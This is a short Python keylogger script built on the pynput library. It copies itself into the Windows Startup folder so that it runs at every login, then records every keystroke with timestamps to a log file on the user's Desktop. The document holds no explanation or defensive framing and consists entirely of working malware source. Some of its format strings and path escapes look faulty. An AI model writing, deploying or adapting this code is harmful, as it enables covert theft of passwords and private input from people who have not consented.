# pip install pynput
from pynput.keyboard import Listener
import os,logging
from shutil import copyfile

user = os.getlogin()
copyfile('main.py',f'C:\\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.py')
logging_dir = f'C:\\Users\{user}\Desktop'
logging.basicConfig(filename=f'{logging_dir}/log.txt',level=logging.DEBUG,format='%(asctime) %(message)s')

def key_handler(key):
    logging.info(key)
with Listener(on_press=key_handler)as listener:
    listener.join()



